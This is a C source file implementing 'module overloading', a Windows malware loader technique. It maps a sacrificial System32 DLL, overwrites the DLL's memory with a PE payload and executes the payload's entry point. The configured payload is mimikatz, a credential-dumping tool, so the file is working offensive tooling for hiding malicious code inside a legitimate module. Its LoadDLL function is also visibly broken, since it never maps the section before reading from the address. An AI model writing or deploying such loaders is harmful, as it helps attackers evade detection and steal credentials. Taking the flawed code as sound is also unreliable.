/*
 * The Module Overloading mechanism described in this module involves several steps to effectively replace a sacrificial DLL with a new PE payload. Below is a detailed explanation of each step:
    Read and Parse the PE Payload:
    This initial step involves reading and parsing the Portable Executable (PE) payload. The PE payload represents the binary code, data, and metadata that will be injected into the system
    Parsing involves understanding the structure of the PE file, including headers, sections, imports, and exports.

    Load the Sacrificial DLL:
    The sacrificial DLL is a placeholder DLL that will be replaced by the new PE payload.
    this DLL is loaded into memory as a part of the process. It serves as the target for overwriting with the contents of the PE payload.

    Resolve the PE Payload's Loading Requirements:
    Before overwriting the sacrificial DLL with the PE payload, certain requirements need to be resolved.
    These include fixing the Import Address Table (IAT), handling relocations, and any other necessary adjustments to ensure the PE payload can run seamlessly in its new environment. This step ensures that all dependencies and references within the PE payload are correctly resolved and mapped to the system.

    Overwrite the Sacrificial DLL with the PE Payload Image:
    With the sacrificial DLL loaded and the loading requirements resolved, the next step is to overwrite the memory space occupied by the sacrificial DLL with the contents of the PE payload.
    This involves copying the entire PE payload image into the memory space previously occupied by the sacrificial DLL. This action effectively replaces the sacrificial DLL with the new PE payload, aligning the memory layout with the structure of the PE file.

    Execute the PE Payload by Running its Entry Point:
    Once the sacrificial DLL has been overwritten with the PE payload, the final step is to execute the payload by running its entry point.
    This entry point marks the starting point of execution for the PE payload code.
    Upon execution, the payload gains control over the execution flow, allowing it to carry out its intended functionality, which could range from malicious activities to legitimate system modifications.
 */

#include <Windows.h>
#include <stdio.h>
#include "Structs.h"

// Macros for error handling
#define pWinError(szWnApiName)	printf("[!] >>  %s Failed With Error: %d \n", szWnApiName, GetLastError());
#define pNtError(szNtApiName, NtErr)	printf("[!] >>  %ws Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

// Macro for safely closing handles
#define DELETE_HANDLE(H)	\
	if (H != NULL && H != INVALID_HANDLE_VALUE){	\
		CloseHandle(H);	\
		H = NULL;	\
	}

// Macro for safely freeing dynamically allocated memory
#define DELETE_POINTER(PNTR)	\
	if (PNTR != NULL){	\
		HeapFree(GetProcessHeap(), 0x00, PNTR);	\
		PNTR = NULL;	\
	}

// Macro to extract filename from path
#define GET_FILENAME(path) (wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path)

// Typedefs for function pointers
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef BOOL(WINAPI* MAIN)();

// Structure for holding NT API function pointers
typedef struct NTAPIFP
{
    fnNtCreateSection	pNtCreateSection;
    fnNtMapViewOfSection	pNtMapViewOfSection;
    fnNtCreateThreadEx	pNtCreateThreadEx;

} NTAPIFP, * PNTAPIFP;

// Structure for PE file headers
typedef struct _PE_HDRS
{
    PBYTE				pFileBuffer;
    DWORD				dwFileSize;

    PIMAGE_NT_HEADERS	pImgNtHdrs;
    PIMAGE_SECTION_HEADER	pImgSecHdr;

    PIMAGE_DATA_DIRECTORY	pEntryImportDataDir;
    PIMAGE_DATA_DIRECTORY	pEntryBaseRelocDataDir;
    PIMAGE_DATA_DIRECTORY	pEntryTLSDataDir;
    PIMAGE_DATA_DIRECTORY	pEntryExceptionDataDir;
    PIMAGE_DATA_DIRECTORY	pEntryExportDataDir;

    BOOL				bIsDLLFile;
} PE_HDRS, * PPE_HDRS;

// Global variable to hold NT API function pointers
NTAPIFP		g_NtApi = { 0x00 };

// Function: ReadFileDisk reads data from a file on disk into memory.
// szFileName   -> Full path of the file to be read.
// ppBuffer     -> Pointer to the base address of the allocated buffer for file data.
// pdwFileSize  -> Pointer to receive the size of the file read, in bytes.
BOOL ReadFileDisk(_In_ LPCWSTR szFileName, _Out_ PBYTE* ppBuffer, _Out_ PDWORD pdwFileSize) {
    HANDLE hFile                            = NULL;   // File handle
    PBYTE  pBuffer                          = NULL;   // Buffer to hold file data
    DWORD dwFileSize, dwNumberOfBytesRead   = 0x00;   // Size of file, number of bytes read

    // Opens specified file with read permissions if the file exists
    if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(TEXT("CreateFileW"));  // Call error handler function
        goto _CleanUp;  // Clean up and exit
    }

    // Retrieve file size (in bytes)
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        pWinError(TEXT("GetFileSize"));  // Call error handler function
        goto _CleanUp;  // Clean up and exit
    }

    // Allocate memory on the heap for file data
    if ((pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
        pWinError(TEXT("HeapAlloc"));  // Call error handler function
        goto _CleanUp;  // Clean up and exit
    }

    // Read data from the file into the buffer
    if(!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        pWinError(TEXT("ReadFile"));  // Call error handler function
        goto _CleanUp;  // Clean up and exit
    }

    // Assign values to output parameters
    *ppBuffer = pBuffer;
    *pdwFileSize = dwFileSize;

    // Clean up and return success status
    _CleanUp:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);  // Close the file handle
    if (!*ppBuffer && pBuffer)
        HeapFree(GetProcessHeap(), 0x00, pBuffer);  // Free allocated buffer memory if not assigned

    return ((*ppBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;  // Return success status
}

// Function loads DLL that allows us to inject our PE payload
// szDllPath        -> Unicode string that wil hold the full path to target DLL
// phModule         -> Receives module handle of the mapped DLL
// psImgSize        -> Pointer that receive the image size of the mapped DLL
BOOL LoadDLL(_In_ LPCWSTR szDllPath, _Out_ HMODULE* phModule, _Out_ PSIZE_T psImgSize) {
    HANDLE hFile                    = INVALID_HANDLE_VALUE;
    HANDLE hSection                 = NULL;
    NTSTATUS STATUS                 = STATUS_SUCCESS;
    ULONG_PTR uMappedModule         = (ULONG_PTR) NULL;
    SIZE_T sViewSize                = (SIZE_T) NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs    = NULL;

    // Check if parameters contain valid values
    if (!szDllPath || !phModule)
        return FALSE;

    // Open the specified DLL file to check if it exists on the system
    if ((hFile = CreateFileW(szDllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(TEXT("CreateFileW"));
        goto _CleanUp;
    }

    // Create a section object with read-only and SEC_IMAGE attributes
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
        pNtError(TEXT("NtCreateSection"), STATUS);
        goto _CleanUp;
    }

    // Close the file handle as it's no longer needed
    DELETE_HANDLE(hFile);

    // Check if it's a valid PE header
    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        goto _CleanUp;

    // Dereference values to the correct parameters
    *phModule = (HMODULE)uMappedModule;
    *psImgSize		= (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage;

    _CleanUp:
    // Clean up resources
    DELETE_HANDLE(hFile);
    DELETE_HANDLE(hSection);

    // Return TRUE if both module handle and entry point are valid, otherwise return FALSE
    return (*phModule) ? TRUE : FALSE;
}


// Function: Initializes the PE headers structure with information from the provided file buffer.
// pPeHdrs      -> Pointer to the PE headers structure to be initialized.
// pFileBuffer  -> Pointer to the buffer containing the PE file data.
// dwFileSize   -> Size of the PE file buffer in bytes.
BOOL InitPeStruct(_Out_ PPE_HDRS pPeHdrs, _In_ PBYTE pFileBuffer, _In_ DWORD dwFileSize) {

    // Check if parameters contain valid values
    if (!pPeHdrs || !pFileBuffer || !dwFileSize)
        return FALSE;

    // Initialize PE headers structure with provided data
    pPeHdrs->pFileBuffer = pFileBuffer;
    pPeHdrs->dwFileSize = dwFileSize;
    pPeHdrs->pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

    // Check if it's a valid PE header
    if (pPeHdrs->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Determine if it's a DLL file
    pPeHdrs->bIsDLLFile = (pPeHdrs->pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;

    // Initialize pointers to various data directories
    pPeHdrs->pImgSecHdr = IMAGE_FIRST_SECTION(pPeHdrs->pImgNtHdrs);
    pPeHdrs->pEntryImportDataDir = &pPeHdrs->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    pPeHdrs->pEntryBaseRelocDataDir = &pPeHdrs->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pPeHdrs->pEntryTLSDataDir = &pPeHdrs->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    pPeHdrs->pEntryExceptionDataDir = &pPeHdrs->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    pPeHdrs->pEntryExportDataDir = &pPeHdrs->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // Return TRUE to indicate successful initialization
    return TRUE;
}

// Function: FixImportAddressTable resolves and fixes the import address table (IAT) of a PE file.
// pEntryImportDataDir      -> Pointer to the import data directory entry of the PE file.
// pPeBaseAddress           -> Base address of the PE file in memory.
BOOL FixImportAddressTable(_In_ PIMAGE_DATA_DIRECTORY pEntryImportDataDir, _In_ PBYTE pPeBaseAddress) {
    PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;

    // Iterate through the import descriptors
    for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        // Get the current import descriptor
        pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);

        // Check for the end of the import descriptor table
        if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
            break;

        // Extract information from the import descriptor
        LPSTR cDllName = (LPSTR)(pPeBaseAddress + pImgDescriptor->Name);
        ULONG_PTR uOriginalFirstThunkRVA = pImgDescriptor->OriginalFirstThunk;
        ULONG_PTR uFirstThunkRVA = pImgDescriptor->FirstThunk;
        SIZE_T ImgThunkSize = 0x00;
        HMODULE hModule = NULL;

        // Load the DLL module
        if (!(hModule = LoadLibraryA(cDllName))) {
            pWinError(TEXT("LoadLibraryA"));
            return FALSE;
        }

        // Iterate through each imported function
        while (TRUE) {
            // Get the original thunk and first thunk
            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
            PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
            FARPROC pFuncAddress = NULL; // Change the type to FARPROC

            // Check for the end of the thunk data
            if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL) {
                break;
            }

            // Resolve function address
            if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
                pFuncAddress = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)); // Cast to LPCSTR
                if (!pFuncAddress) {
                    printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
                    return FALSE;
                }
            } else {
                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
                pFuncAddress = GetProcAddress(hModule, pImgImportByName->Name);
                if (!pFuncAddress) {
                    printf("[!] >>  Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
                    return FALSE;
                }
            }

            // Fix the function address in the first thunk
            pFirstThunk->u1.Function = (ULONG_PTR)pFuncAddress;
            ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
        }
    }

    // Return TRUE to indicate successful fixing of the import address table
    return TRUE;
}


// Function: FixReloc applies base relocation to a PE file loaded into memory.
// pEntryBaseRelocDataDir       -> Pointer to the base relocation data directory entry of the PE file.
// pPeBaseAddress               -> Base address of the PE file in memory.
// pPreferableAddress           -> Preferred base address of the PE file.
BOOL FixReloc(_In_ PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, _In_ ULONG_PTR pPeBaseAddress, _In_ ULONG_PTR pPreferableAddress) {
    PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);
    ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;
    PBASE_RELOCATION_ENTRY pBaseRelocEntry = NULL;

    // Iterate through base relocation blocks
    while (pImgBaseRelocation->VirtualAddress) {
        pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

        // Iterate through relocation entries within the block
        while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
            switch (pBaseRelocEntry->Type) {
                case IMAGE_REL_BASED_DIR64:
                    // Update 64-bit address
                    *((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    // Update 32-bit address
                    *((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    // Update high 16 bits of a 32-bit address
                    *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
                    break;
                case IMAGE_REL_BASED_LOW:
                    // Update low 16 bits of a 32-bit address
                    *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    // No relocation needed
                    break;
                default:
                    printf("[!] >> Unknown relocation type: %d | Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
                    return FALSE;
            }
            pBaseRelocEntry++;
        }
        pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
    }
    return TRUE;
}

// Function: Fixes memory permissions of sections in a PE file loaded into memory.
// pPeBaseAddress       -> Base address of the PE file in memory.
// pImgNtHdrs           -> Pointer to the NT headers of the PE file.
// pImgSecHdr           -> Pointer to the section headers of the PE file.
BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {
    // Iterate through section headers
    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD dwProtection = 0x00, dwOldProtection = 0x00;

        // Skip sections with no raw data or virtual address
        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        // Determine memory protection based on section characteristics
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtection = PAGE_WRITECOPY;
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtection = PAGE_READONLY;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_READWRITE;
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtection = PAGE_EXECUTE;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtection = PAGE_EXECUTE_WRITECOPY;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READ;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READWRITE;

        // Change memory protection
        if (!VirtualProtect((PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
            pWinError(TEXT("VirtualProtect"));
            return FALSE;
        }
    }
    return TRUE;
}

// Function: Overwrites a sacrificial DLL loaded into memory with a new PE payload.
// uMappedDll       -> Base address of the sacrificial DLL in memory.
// sMappedImgSize   -> Size of the mapped image (DLL) in memory.
// uPePayload       -> Base address of the new PE payload to be written.
// sPePayloadSize   -> Size of the PE payload.
BOOL OverWriteSacrificialDll(IN ULONG_PTR uMappedDll, IN SIZE_T sMappedImgSize, IN ULONG_PTR uPePayload, IN SIZE_T sPePayloadSize) {
    DWORD dwOldProtection = 0x00;

    // Check for valid parameters
    if (!uMappedDll || !uPePayload || !sPePayloadSize)
        return FALSE;

    // Check if both start with "MZ" (DOS Header)
    if (*(unsigned short*)uMappedDll != *(unsigned short*)uPePayload)
        return FALSE;

    // Allow writing to the sacrificial DLL
    if (!VirtualProtect((LPVOID)uMappedDll, sMappedImgSize, PAGE_READWRITE, &dwOldProtection)) {
        pWinError(TEXT("VirtualProtect"));
        return FALSE;
    }

    printf("[!] >> Overwriting Sacrificial DLL ... ");

    // Overwrite the sacrificial DLL with the new PE payload
    memset((void*)uMappedDll, 0x00, sMappedImgSize);
    memcpy((void*)uMappedDll, (const void*)uPePayload, sPePayloadSize);

    printf("[+] >>  DONE \n");

    return TRUE;
}

// Function: Overloads a sacrificial DLL with a new PE payload.
// szSacrificialDllName -> Path to the sacrificial DLL.
// pPeHdrs              -> Pointer to the parsed PE headers of the new payload.
BOOL ModuleOverLoad(IN LPCWSTR szSacrificialDllName, IN PPE_HDRS pPeHdrs) {

    // Variables for memory mapping and manipulation
    ULONG_PTR uMappedDll = (ULONG_PTR) NULL;       // Base address of the sacrificial DLL in memory
    SIZE_T sMappedImgSize = (SIZE_T) NULL;      // Size of the mapped image (DLL) in memory
    PBYTE pPeBaseAddress = NULL;       // Base address of the PE payload in memory
    PBYTE pPeEntryPnt = NULL;          // Entry point of the PE payload
    DWORD dwOldProtection = 0x00;      // Old memory protection flags

    // Check for valid parameters
    if (!szSacrificialDllName || !pPeHdrs)
        return FALSE;

    // Load the sacrificial DLL into memory
    if (!LoadDLL(szSacrificialDllName, &uMappedDll, &sMappedImgSize))
        return FALSE;

    // Print information about the loaded sacrificial DLL
    printf("[*] >> Sacrificial DLL [%ws] Is Loaded At [ 0x%p ] Of Size [ %d ]\n", GET_FILENAME(szSacrificialDllName), (void*)uMappedDll, (int)sMappedImgSize);

    // Ensure the size of the sacrificial DLL is sufficient for the payload
    if (sMappedImgSize < pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfImage)
        return FALSE;

    // Allocate a temporary buffer to hold the PE payload
    if ((pPeBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfImage)) == NULL) {
        pWinError(TEXT("HeapAlloc"));
        return FALSE;
    }

    // Copy the headers and sections of the PE payload into the temporary buffer
    memcpy(pPeBaseAddress, pPeHdrs->pFileBuffer, pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfHeaders);
    for (int i = 0; i < pPeHdrs->pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        memcpy((PVOID)(pPeBaseAddress + pPeHdrs->pImgSecHdr[i].VirtualAddress),
               (PVOID)((ULONG_PTR)pPeHdrs->pFileBuffer + pPeHdrs->pImgSecHdr[i].PointerToRawData),
               pPeHdrs->pImgSecHdr[i].SizeOfRawData);
    }

    // Fix the Import Address Table (IAT) of the payload
    if (!FixImportAddressTable(pPeHdrs->pEntryImportDataDir, pPeBaseAddress))
        goto _FunctionFailure;

    // Overwrite the sacrificial DLL with the PE payload
    if (!OverWriteSacrificialDll(uMappedDll, sMappedImgSize, (ULONG_PTR)pPeBaseAddress, pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfImage))
        goto _FunctionFailure;

    // Free the temporary buffer
    DELETE_POINTER(pPeBaseAddress);

    // Fix relocations in the payload
    if (!FixReloc(pPeHdrs->pEntryBaseRelocDataDir, uMappedDll, pPeHdrs->pImgNtHdrs->OptionalHeader.ImageBase))
        goto _FunctionFailure;

    // Fix memory permissions for the payload headers
    if (!VirtualProtect((LPVOID)uMappedDll, pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProtection)) {
        pWinError(TEXT("VirtualProtect"));
        goto _FunctionFailure;
    }

    // Fix memory permissions for the payload sections
    if (!FixMemPermissions(uMappedDll, pPeHdrs->pImgNtHdrs, pPeHdrs->pImgSecHdr))
        goto _FunctionFailure;

    // Get the entry point of the payload
    pPeEntryPnt = (PBYTE)(uMappedDll + pPeHdrs->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    printf("[i] Payload Entry Point: 0x%p \n", pPeEntryPnt);

    // Execute the payload
    if (pPeHdrs->bIsDLLFile) { // If the payload is a DLL
        DLLMAIN pDllMain = (DLLMAIN)pPeEntryPnt;
        return pDllMain((HINSTANCE)uMappedDll, DLL_PROCESS_ATTACH, NULL);
    } else { // If the payload is an executable
        MAIN pMain = (MAIN)pPeEntryPnt;
        return pMain();
    }

    // Handle failure
    _FunctionFailure:
    DELETE_POINTER(pPeBaseAddress);
    return FALSE;
}

// Define file paths
#define SACRIFICAL_DLL	L"C:\\Windows\\System32\\WsmSvc.dll"
#define PAYLOAD_PE		L"C:\\Users\\D3v\\Downloads\\mimikatz-master\\mimikatz-master\\x64\\mimikatz.exe"

int main() {
    HMODULE hNtdll = NULL;
    PBYTE pFileBuffer = NULL;
    DWORD dwFileSize = 0x00;
    PE_HDRS PeHdrStruct = { 0x00 };

    // Load necessary functions from NTDLL
    hNtdll = GetModuleHandle(TEXT("NTDLL"));
    if (!hNtdll)
        return -1;

    g_NtApi.pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    g_NtApi.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    g_NtApi.pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!g_NtApi.pNtCreateSection || !g_NtApi.pNtMapViewOfSection || !g_NtApi.pNtCreateThreadEx)
        return -1;

    // Read the PE file from disk
    if (!ReadFileDisk(PAYLOAD_PE, &pFileBuffer, &dwFileSize))
        return -1;

    // Print information about the loaded PE file
    printf("[*] >>  %ws Is Loaded At [ %p ] Of Size [ %d ]\n", GET_FILENAME(PAYLOAD_PE), (void*)pFileBuffer, dwFileSize);

    // Initialize the PE structure
    if (!InitPeStruct(&PeHdrStruct, pFileBuffer, dwFileSize))
        return -1;

    // Overload the sacrificial DLL with the PE payload
    if (!ModuleOverLoad(SACRIFICAL_DLL, &PeHdrStruct))
        return -1;

    // Wait indefinitely
    WaitForSingleObject((HANDLE)-1, INFINITE);
    return 0;
}